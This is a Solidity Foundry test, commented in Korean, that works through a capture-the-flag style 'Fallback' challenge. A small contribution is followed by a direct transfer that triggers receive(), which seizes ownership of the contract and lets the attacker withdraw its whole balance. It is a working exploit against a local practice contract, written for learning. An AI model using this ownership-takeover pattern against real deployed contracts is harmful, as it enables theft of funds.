// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback fb;
    address attacker;

    function setUp() public {
        fb = new Fallback(); // 배포자(이 테스트 컨트랙트)가 최초 owner
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    /// @notice receive() "옆문"으로 owner를 탈취하고 잔액을 인출한다.
    function testTakeover() public {
        // 1) 소액 기여 → contributions[attacker] > 0 (단, 아직 owner 아님)
        vm.prank(attacker);
        fb.contribute{value: 1 wei}();
        assertGt(fb.contributions(attacker), 0);
        assertTrue(fb.owner() != attacker);

        // 2) 컨트랙트로 직접 송금 → receive() 트리거 → owner 탈취
        vm.prank(attacker);
        (bool s, ) = address(fb).call{value: 1 wei}("");
        assertTrue(s, "receive call failed");
        assertEq(fb.owner(), attacker);

        // 3) 탈취한 owner 권한으로 컨트랙트 잔액 전액 인출
        assertGt(address(fb).balance, 0);
        vm.prank(attacker);
        fb.withdraw();
        assertEq(address(fb).balance, 0);
    }
}
